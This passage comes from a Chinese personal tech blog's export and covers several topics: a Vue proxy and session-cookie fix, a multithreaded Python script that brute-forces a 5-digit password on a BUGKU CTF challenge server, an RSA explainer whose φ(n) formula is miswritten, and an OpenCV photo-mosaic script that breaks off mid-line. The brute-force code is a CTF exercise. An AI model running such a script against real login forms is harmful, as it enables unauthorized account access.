<p>在需要发送请求的地方加上前缀url：”api”</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$axios.get(<span class="string">"/api/beforeLogin"</span>).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<hr>
<p>这样子虽然能够发送请求，后台也能够接受数据，但是！！！，每次发送的sessionID都不一样，这样子无法进行登陆验证（你会发现每次登陆后，下次还要登陆），在浏览器里边打开审查元素也看不到Cookie，但是在响应头Response headers里边看到了set-cookie：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set-cookie: JSESSIONID&#x3D;DFBEA9837130E7DA23723674A2B3EFE9; Path&#x3D;&#x2F;testJson4servlet; HttpOnly</span><br></pre></td></tr></table></figure>

<p>注意到后面的这个<code>testJson4servlet</code>，这个地址刚好是我后台<code>tomcat</code>的项目地址。</p>
<p>由于我们前面使用代理的时候设置了rul前缀为api，导致这里对应不上，因此需要在<code>vue.config.js</code>改我们的前缀<code>url</code>为我们的项目地址</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line"></span><br><span class="line">    devServer: &#123;</span><br><span class="line">        port: <span class="number">8081</span>,</span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">'/testJson4servlet'</span>: &#123;</span><br><span class="line"></span><br><span class="line">                target: <span class="string">'http://localhost:8080/testJson4servlet/'</span>,</span><br><span class="line">                ws: <span class="literal">false</span>,</span><br><span class="line">                changeOrigin: <span class="literal">true</span>,</span><br><span class="line">                pathRewrite: &#123;</span><br><span class="line">                    <span class="string">'^/testJson4servlet'</span>: <span class="string">''</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        disableHostCheck: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求代码相应地进行修改</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$axios.get(<span class="string">"/api/beforeLogin"</span>).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>后台打印的sessionId终于短时间内不会改变了！！！:D</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue初级</category>
      </categories>
      <tags>
        <tag>Cookie</tag>
        <tag>Vue</tag>
        <tag>axios</tag>
      </tags>
  </entry>
  <entry>
    <title>使用python多线程爆破数字密码</title>
    <url>/2022/05/14/%E4%BD%BF%E7%94%A8python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%86%E7%A0%B4%E6%95%B0%E5%AD%97%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说起网络密码爆破，我们可能第一时间想到大名鼎鼎的软件<code>Burp Suite</code>，该软件可以方便地进行网络代理，数据截包、改包，密码爆破，但是密码爆破效率实在是太低，如果我们知道密码的类型，例如是纯数字的密码，那我们可以将密码进行分段，不同的范围使用一个线程进行爆破，利用并发进行节省时间。</p>
<a id="more"></a>

<h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p><code>BUGKU</code>的<a href="https://ctf.bugku.com/challenges/detail/id/82.html" target="_blank" rel="noopener">《好像需要密码》</a></p>
<p>打开题目后，我们发现只需要提交一个密码的表单即可，而且知道了是<code>5</code>位数字，即<code>00000</code>-<code>99999</code>。</p>
<p>分析了范围以后，接下来就是将密码分段，然后开启一个个线程执行爆破程序，详细如代码所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试爆破 [start, end] 区间的密码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(name, start, end)</span>:</span></span><br><span class="line">    print(<span class="string">'thread %s start! %s ---&gt; %s'</span> % (name, start, end))</span><br><span class="line">    pas = start</span><br><span class="line">    <span class="keyword">while</span> pas &lt;= end:</span><br><span class="line">        test = requests.post(<span class="string">'http://114.67.175.224:15120'</span>, data=&#123;<span class="string">'pwd'</span>: pas&#125;)</span><br><span class="line">        <span class="comment"># 如果响应体中含有 flag 字样，说明密码争取</span></span><br><span class="line">        <span class="comment"># 实际上也可以将每一个响应体的长度进行统计，含有 flag 的一般跟其他的是不一样的</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> test.text:</span><br><span class="line">            print(<span class="string">'The correct password is：'</span>, pas)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pas += <span class="number">1</span></span><br><span class="line">    print(<span class="string">'thread %s end! '</span> % (name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 从 10000-99999  我这里偷懒了，把0-9999的去掉了 hhhh</span></span><br><span class="line">    start, end = <span class="number">10000</span>, <span class="number">100000</span></span><br><span class="line">    <span class="comment"># 线程总数</span></span><br><span class="line">    total = <span class="number">500</span></span><br><span class="line">    <span class="comment"># 每个线程要爆破的区间长度</span></span><br><span class="line">    step = int((end - start) / total)</span><br><span class="line">    left = start</span><br><span class="line">    threadsList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(total):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 创建线程并传递参数过去</span></span><br><span class="line">            t = threading.Thread(target=hack, args=(<span class="string">"Thread-"</span> + str(i), left, left + step,))</span><br><span class="line">            <span class="comment"># 线程开始执行</span></span><br><span class="line">            t.start()</span><br><span class="line">            threadsList.append(t)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"Error: unable to start thread"</span>)</span><br><span class="line">        left += step</span><br><span class="line">    <span class="comment"># 主线程等待其他线程完毕后再退出</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadsList:</span><br><span class="line">        t.join()</span><br><span class="line">    print(<span class="string">'main thread end!!'</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p>==黑帽白帽，就在一念之间！==</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>公钥密码算法之RSA</title>
    <url>/2022/08/14/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E4%B9%8BRSA/</url>
    <content><![CDATA[<p>本文参考自文章<a href="https://weread.qq.com/web/bookDetail/77d32500721a485577d8eee" target="_blank" rel="noopener">【从0到1：CTFer成长之路】</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>笼统而言，密码学可以分为古典密码和现代密码阶段，古典密码涉及知识较为简单，容易理解，现代密码融入了大量数论知识，安全性能也大幅提升。</p>
<blockquote>
<p>自从科克霍夫原则和对称加密体制被提出后，密码学进入了现代密码阶段。成熟的分组密码、流密码的加密强度和加密效率都非常优秀，然而对称密码体系存在着一个不可忽略的问题——密钥的传输需要一个安全的信道，否则一旦密钥被截获，对称加密就毫无安全性可言。另外，对称加密体制并没有解决信息的认证与不可否认性的问题。</p>
</blockquote>
<p>1976年,Whitfield Diffie和Martin Hellman发表了<a href="https://ieeexplore.ieee.org/document/1055638" target="_blank" rel="noopener">New directions in cryptography</a>这篇划时代的文章，奠定了公钥密码系统的基础，而在1977年，Ron Rivest、Adi Shamir和Leonard Adleman发明了一种直到今天还被广泛运用的公钥密码算法——RSA。</p>
<p>该算法运用的数学原理是：将两个大素数相乘比较简单，但是要把这两个素数的乘积进行因式分解却是及其困难的。</p>
<a id="more"></a>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>算法开始之前，先选取两个较大的不同素数<code>p</code>和<code>q</code>（一般大于<code>512bit</code>，即2^512）。令：</p>
<p>$$<br>n=pq<br>$$</p>
<p>再求<code>n</code>的欧拉函数：</p>
<p>$$<br>\varphi (n)=\varphi (p-1)\varphi (q-1)<br>$$</p>
<p>再选取一个与该欧拉函数值互质的整数<code>e</code>，为了加速运算，通常选一个较小，但不至于太小的素数，如65537。</p>
<p>求得<code>e</code>模$\varphi (n)$的逆元<code>d</code>，即：</p>
<p>$$<br>ed \equiv 1 \pmod{\varphi (n)}<br>$$</p>
<p>然后<code>&lt;n, e&gt;</code>作为公钥，可以对外公布，不用担心别人窃取，可以用于发送方加密信息；<code>&lt;n, d&gt;</code>作为私钥，用户自己保留，用于解密信息。</p>
<p><code>RSA</code>系统工作流程如下：</p>
<ol>
<li><p>发送消息双方产生密钥对（公钥和私钥），保留私钥，交换公钥。</p>
</li>
<li><p>假设阿珍要传输信息给阿强，传输的内容为<code>m</code>，计算：</p>
</li>
</ol>
<p>$$<br>   c=m^e\pmod{n},其中(0\le m\lt n)<br>$$</p>
<ol start="3">
<li><p>阿珍将<code>c</code>发送给阿强</p>
</li>
<li><p>阿强收到信息后，计算：</p>
</li>
</ol>
<p>$$<br>   m1=c^d\pmod{n}<br>$$</p>
<ol start="5">
<li>可以验证，<code>m1</code>和<code>m</code>是相等的。</li>
</ol>
<p>举个简单的例子：</p>
<p>取<code>p=11</code>,<code>q=7</code>，则<code>n=77</code>,再取<code>e=13</code>，则<code>d=37</code>(13 x 37 = 481,481 % 60 = 1)，发送的明文为8：</p>
<p>$$<br>c=8^{13}\pmod{77}=50<br>$$</p>
<p>解密：</p>
<p>$$<br>m=50^{37}\pmod{77}=8<br>$$</p>
<p>下面我们来证明<code>m1</code>和<code>m</code>是相等的，即$m=c^d\pmod{n}$，由于m&lt;n,故只要证明：</p>
<p>$$<br>c^d\equiv m\pmod{n}<br>$$</p>
<p>而加密的时候：</p>
<p>$$<br>c=m^e\pmod{n}<br>$$</p>
<p>即，只要证：</p>
<p>$$<br>m^{e*d}\equiv m\pmod{n}<br>$$</p>
<p>因为<code>e</code>和<code>d</code>互为逆元，即$ed \equiv 1 \pmod{\varphi (n)}$，则必存在整数k，使得：</p>
<p>$$<br>e<em>d=k</em>\varphi (n)+1<br>$$</p>
<p>存在两种情况：</p>
<h3 id="情况1：m和n互素"><a href="#情况1：m和n互素" class="headerlink" title="情况1：m和n互素"></a>情况1：m和n互素</h3><blockquote>
<p>欧拉定理：若 gcd(a, m) =1，则$ a^{\varphi (m)}\equiv 1\pmod{m} $</p>
</blockquote>
<p>m和n互素，有$  gcd(n, m)=1 $，根据欧拉定理，有</p>
<p>$$<br>m^{\varphi (n)}\equiv 1\pmod{n}<br>$$</p>
<p>即:</p>
<p>$$<br>m^{e<em>d}\equiv m^{k</em>\varphi (n)+1} \equiv m<em>m^{k</em>\varphi (n)}\equiv m\pmod{n}<br>$$</p>
<p>得证！</p>
<h2 id="情况2：m和n不互素"><a href="#情况2：m和n不互素" class="headerlink" title="情况2：m和n不互素"></a>情况2：m和n不互素</h2><p>二者不互素，则最大公约数不为1，由于$m&lt;n$，且$n=pq$，p和q都是素数，且二者不等，故m的因子中必含p或者q中之一，且只含一个而不含另外一个（同时含的话，则$m&gt;=pq=n$，矛盾）。不妨含p，即存在$m=cp$，同时m与q互素，由费马小定理可得：</p>
<p>$$<br>m^{q-1}\equiv 1\pmod{q}<br>$$</p>
<blockquote>
<p>费马小定理：如果q是一个质数，而整数a不是q的倍数，则有$a^{q-1}\equiv 1\pmod{q}$</p>
</blockquote>
<p>进一步，有：</p>
<p>$$<br>m^{k\varphi (n)} \equiv m^{k(p-1)(q-1)}\equiv 1^{k(p-1)}\equiv 1 \pmod{q}<br>$$</p>
<p>即存在一个整数h，使得：</p>
<p>$$<br>m^{k\varphi (n)}=hq+1<br>$$</p>
<p>两边同乘以一个m，注意上文中$m=cp$，有：</p>
<p>$$<br>m^{k\varphi (n)+1}=cp(hq+1)=cphq+m=hcn+m<br>$$</p>
<p>两边模n，有：</p>
<p>$$<br>m^{k\varphi (n)+1}\equiv m^{ed}\equiv  m \pmod{n}<br>$$</p>
<p>综上，解密得到的<code>m1</code>和原来的明文<code>m</code>是相等的。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>RSA公钥密码的安全性依赖于大整数因式分解的困难性，如果知道了p和q，很容易求得公钥e关于模$\varphi (n)$的逆元d。如果不知道p和q，按照现在的计算机能力，听说分解一个400位整数需要花费上亿年时间，:D </p>
<p>当p和q是超过两百位的素数时候，可以粗略地说，RSA是暂时安全的。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>借助OpenCV拼接特定背景图</title>
    <url>/2022/01/21/%E5%80%9F%E5%8A%A9OpenCV%E6%8B%BC%E6%8E%A5%E7%89%B9%E5%AE%9A%E8%83%8C%E6%99%AF%E5%9B%BE/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前就一直有一个想法，提供大量图片以及一张背景图，然后将这些图片组成一个个小网格拼接起来，然后效果和原背景图差不多，简而言之就是将原背景图马赛克化，只不过每一个马赛克是用提供的图片组成，现在放寒假了终于有时间开干啦，哈哈哈哈哈。</p>
<a id="more"></a>

<p>先看下效果：</p>
<p>原背景图</p>
<p><img src="https://qiniu.yalexin.top/bgr.jpg" alt></p>
<p>拼接结果图</p>
<p><img src="https://qiniu.yalexin.top/cat-mouse.png" alt></p>
<p>emmm，勉强能看，有点抽象</p>
<p>只能看缩略图了</p>
<p><img src="https://qiniu.yalexin.top/thumbnail.png" alt></p>
<p><strong>不过只要你电脑配置够好，时间也充足，可以将图片分割成更多的小方格，效果也更佳。</strong></p>
<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>基本原理其实很简单：就是首先计算每一张素材图片的颜色平均值，然后计算背景图中的每一个小方格的颜色平均值，然后两两匹配就行了。</p>
<p>下面说一下具体操作</p>
<p>对于素材，也就是上面所提到的“大量图片”，我觉得最快速的获取方式就是视频，毕竟一个视频里边每一帧都可以作为一张图片，如果视频是<code>24</code>帧每秒，一分钟就可以提供<code>24*60=1440</code>张图片，对于我这个一年拍的生活照都不超过200张的蓝人来说，<code>1440</code>难以想象。但是对于视频来说，每一帧都分析的话，花费时间太多，并且其实有一些邻近帧的平均颜色<strong>相差不多</strong>，为了加快分析可以取一定间隔进行分析，<code>OpenCV</code>也提供了提取指定位置的帧的方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cap.set(cv2.CAP_PROP_POS_FRAMES, idx)</span><br></pre></td></tr></table></figure>

<p>但是这个性能上面比较慢，我们可以顺序读取每一帧，然后根据间隔再分析：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 视频总帧数</span></span><br><span class="line">frameNum = cap.get(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 提取帧数的步长</span></span><br><span class="line">step = frameNum // needNum</span><br><span class="line">cnt, idx = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">imgList = []</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        print(<span class="string">'\r'</span> + <span class="string">'-'</span> * (int(idx / frameNum * <span class="number">100</span>)) + str(int(idx / frameNum * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> idx % step == <span class="number">0</span>:</span><br><span class="line">            aver = frame.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">            averHex = BGR2HEX(aver)</span><br><span class="line">            <span class="comment"># 先将暂存帧保存起来</span></span><br><span class="line">            cv2.imwrite(PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>, frame)</span><br><span class="line">            imgList.append([averHex, PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>])</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> imgList</span><br></pre></td></tr></table></figure>

<p>经过实测，花费时间减少到原来方法的一半！</p>
<p>对<code>imgList</code>进行排序是方便后面匹配的时候使用二分查找。</p>
<p>程序也支持自己提供素材图片，不过自己能提供几千张图片以上估计很难吧？？</p>
<p>然后进行背景图的分割，理论上背景图分割得越精细越好，但是如此一来需要匹配的次数就越多，程序运行时间越多，而且拼接出来的图片也很大，但是分割数目太少，拼接出来的图片与原图相差甚远，因此要挑选好要切割的行数和列数。</p>
<p>匹配过程比较好理解，我们实现把背景图切割成<code>m*n</code>个小宫格，计算每一个小宫格的平均颜色，然后遍历每一个小宫格，在<code>imgList</code>中使用二分查找与之相近的图片，并拿到该图片的名字再读取进来（我们并不在<code>imgList</code>中保存每一张图片，因为如果我们可能有几千到上万的图片，如果每一张图都有<code>1MB</code>大小，那我们就需要好几个<code>GB</code>的内存，而现在我们<code>imgList</code>中每一个元素都是包含了该图片的名字和平均颜色值）， 而<code>OpenCV</code>读取的图片返回值是矩阵，图片的拼接也就是对应矩阵的拼接，不过要注意的是区分按列拼接和按行拼接。</p>
<p>当然了为了防止输出的文件过大，拼接过程还应该将素材图片进行缩放。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Author      : YaleXin</span></span><br><span class="line"><span class="string">Email       :</span></span><br><span class="line"><span class="string">LastEditors : YaleXin</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> bisect</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 视频链接</span></span><br><span class="line">VIDEO_URL = <span class="string">"data/mouseAndCat.mp4"</span></span><br><span class="line"><span class="comment"># 素材图片文件夹</span></span><br><span class="line">PICTURES_DIR = <span class="string">"materialPics/"</span></span><br><span class="line"><span class="comment"># 背景图</span></span><br><span class="line">BACKGROUND_URL = <span class="string">"bgr.jpg"</span></span><br><span class="line"><span class="comment"># 输出图片结果名</span></span><br><span class="line">OUTPUT_PICTURE = <span class="string">"result.jpg"</span></span><br><span class="line"><span class="comment"># 缩放比例</span></span><br><span class="line">ZOOM_FACTOR = <span class="number">4</span></span><br><span class="line"><span class="comment"># 切割图片的行数、列数</span></span><br><span class="line">ROW, COL = <span class="number">41</span>, <span class="number">41</span></span><br><span class="line">cap = cv2.VideoCapture(VIDEO_URL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将指定图片进行裁剪 m n 分别是行数列数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cutBackgroundImg</span><span class="params">(img, m=<span class="number">21</span>, n=<span class="number">21</span>)</span>:</span></span><br><span class="line">    <span class="comment"># 背景图片的高度和宽度</span></span><br><span class="line">    h, w = img.shape[<span class="number">0</span>], img.shape[<span class="number">1</span>]</span><br><span class="line">    grid_h = int(h * <span class="number">1.0</span> / (m - <span class="number">1</span>) + <span class="number">0.5</span>)</span><br><span class="line">    grid_w = int(w * <span class="number">1.0</span> / (n - <span class="number">1</span>) + <span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 满足整除关系时的高、宽</span></span><br><span class="line">    h = grid_h * (m - <span class="number">1</span>)</span><br><span class="line">    w = grid_w * (n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 图像缩放</span></span><br><span class="line">    img_re = cv2.resize(img, (w, h),</span><br><span class="line">                        cv2.INTER_LINEAR)  <span class="comment"># 也可以用img_re=skimage.transform.resize(img, (h,w)).astype(np.uint8)</span></span><br><span class="line">    gx, gy = np.meshgrid(np.linspace(<span class="number">0</span>, w, n), np.linspace(<span class="number">0</span>, h, m))</span><br><span class="line">    gx = gx.astype(np.int)</span><br><span class="line">    gy = gy.astype(np.int)</span><br><span class="line">    <span class="comment"># 前面两维代表位置 i行j列 后三维代表图片信息（像素位置、颜色信息）</span></span><br><span class="line">    divide_image = np.zeros([m - <span class="number">1</span>, n - <span class="number">1</span>, grid_h, grid_w, <span class="number">3</span>],</span><br><span class="line">                            np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">            divide_image[i, j, ...] = img_re[</span><br><span class="line">                                      gy[i][j]:gy[i + <span class="number">1</span>][j + <span class="number">1</span>], gx[i][j]:gx[i + <span class="number">1</span>][j + <span class="number">1</span>], :]</span><br><span class="line">    <span class="keyword">return</span> divide_image</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  分析分割后的图片 divideImages 是背景图分割后的一系列图片 materialIndexColor是包含颜色均值的一些列图片（从视频中提取或者用户提供）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleBlocks</span><span class="params">(divideImages, materialIndexColor)</span>:</span></span><br><span class="line">    print(<span class="string">'--- handleBlocks begin ---'</span>)</span><br><span class="line">    beginTime = time.time()</span><br><span class="line">    cap.set(cv2.CAP_PROP_POS_FRAMES, <span class="number">0</span>)</span><br><span class="line">    res0, frame0 = cap.read()</span><br><span class="line">    originX, originY = frame0.shape[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    sortedAverColor = np.array(materialIndexColor)[:, <span class="number">0</span>].astype(<span class="string">"int32"</span>)</span><br><span class="line">    m, n = divideImages.shape[<span class="number">0</span>], divideImages.shape[<span class="number">1</span>]</span><br><span class="line">    cnt, total, listLen = <span class="number">0</span>, (m + <span class="number">1</span>) * (n + <span class="number">1</span>), len(materialIndexColor)</span><br><span class="line">    resImg = np.array([])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        rowItem = np.array([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            aver = divideImages[i, j].mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">            averHex = BGR2HEX(aver)</span><br><span class="line">            <span class="comment"># 在有序序列中寻找接近该 块（来自背景图） 的图片</span></span><br><span class="line">            left = bisect.bisect_left(sortedAverColor, averHex)</span><br><span class="line">            left = max(<span class="number">0</span>, left)</span><br><span class="line">            left = min(left, listLen - <span class="number">1</span>)</span><br><span class="line">            imgFilename = materialIndexColor[left][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            frame = cv2.imread(imgFilename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> rowItem.shape == (<span class="number">0</span>,):</span><br><span class="line">                <span class="comment"># 拼接列</span></span><br><span class="line">                rowItem = cv2.resize(frame, (originY // ZOOM_FACTOR, originX // ZOOM_FACTOR))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rowItem = np.concatenate((rowItem, cv2.resize(frame, (originY // ZOOM_FACTOR, originX // ZOOM_FACTOR))),</span><br><span class="line">                                         <span class="number">1</span>)</span><br><span class="line">            print(<span class="string">'\r'</span> + <span class="string">'+'</span> * (int(cnt / total * <span class="number">100</span>)) + str(int(cnt / total * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> resImg.shape == (<span class="number">0</span>,):</span><br><span class="line">            resImg = rowItem</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 拼接行</span></span><br><span class="line">            resImg = np.concatenate((resImg, rowItem))</span><br><span class="line">    cv2.imwrite(OUTPUT_PICTURE, resImg)</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line">    <span class="comment"># 删除中间生成的文件</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> materialIndexColor:</span><br><span class="line">        os.remove(item[<span class="number">1</span>])</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    print(<span class="string">'\n---- handleMaterial2 finished and cost &#123;&#125; --------'</span>.format(endTime - beginTime))</span><br><span class="line">    print(<span class="string">'\n--- handleBlocks end ---'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将BGR数组转为 RGB16进制形式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BGR2HEX</span><span class="params">(BGR)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (int(BGR[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) + (int(BGR[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + int(BGR[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleMaterial</span><span class="params">(needNum=<span class="number">500</span>)</span>:</span></span><br><span class="line">    print(<span class="string">'--- handleMaterial begin ---'</span>)</span><br><span class="line">    <span class="comment"># 视频总帧数</span></span><br><span class="line">    frameNum = cap.get(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># 提取帧数的步长</span></span><br><span class="line">    step = frameNum / needNum</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    imgList = []</span><br><span class="line">    <span class="comment"># 按照步长分析每一帧</span></span><br><span class="line">    <span class="keyword">for</span> cnt <span class="keyword">in</span> range(needNum):</span><br><span class="line">        print(<span class="string">'\r'</span> + <span class="string">'-'</span> * (cnt * <span class="number">100</span> // needNum) + str(cnt * <span class="number">100</span> // needNum) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        cap.set(cv2.CAP_PROP_POS_FRAMES, idx)</span><br><span class="line"></span><br><span class="line">        res, frame = cap.read()</span><br><span class="line"></span><br><span class="line">        aver = frame.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        averHex = BGR2HEX(aver)</span><br><span class="line">        <span class="comment"># cnt 是标记该元素在imgList中的下标，idx是标记该帧在原视频中的下标</span></span><br><span class="line">        imgList.append([cnt, averHex, idx])</span><br><span class="line"></span><br><span class="line">        idx += step</span><br><span class="line">    print(<span class="string">'\n---- handleMaterial finished! --------'</span>)</span><br><span class="line">    imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> imgList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handlePictures</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'--- handlePictures begin ---'</span>)</span><br><span class="line">    imgList = []</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(PICTURES_DIR):</span><br><span class="line">        imgsFiles = os.listdir(PICTURES_DIR)</span><br><span class="line">        fileLen = len(imgsFiles)</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> imgsFiles:</span><br><span class="line">            fileType = os.path.splitext(file)[<span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 常见的图片格式</span></span><br><span class="line">            <span class="keyword">if</span> fileType == <span class="string">'.jpg'</span> <span class="keyword">or</span> fileType == <span class="string">'.jpeg'</span> <span class="keyword">or</span> fileType == <span class="string">'.png'</span> <span class="keyword">or</span> fileType == <span class="string">'.bmp'</span> <span class="keyword">or</span> fileType == <span class="string">'.svg'</span>:</span><br><span class="line">                img = cv2.imread(PICTURES_DIR + file)</span><br><span class="line">                <span class="comment"># 判断图片是否读取成功</span></span><br><span class="line">                <span class="keyword">if</span> isinstance(img, np.ndarray):</span><br><span class="line">                    aver = img.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">                    averHex = BGR2HEX(aver)</span><br><span class="line">                    cv2.imwrite(PICTURES_DIR + <span class="string">'cache-'</span> + file, img)</span><br><span class="line">                    imgList.append([averHex, PICTURES_DIR + <span class="string">'cache-'</span> + file])</span><br><span class="line">                    print(<span class="string">'\r'</span> + <span class="string">'+'</span> * (int(cnt / fileLen * <span class="number">100</span>)) + str(int(cnt / fileLen 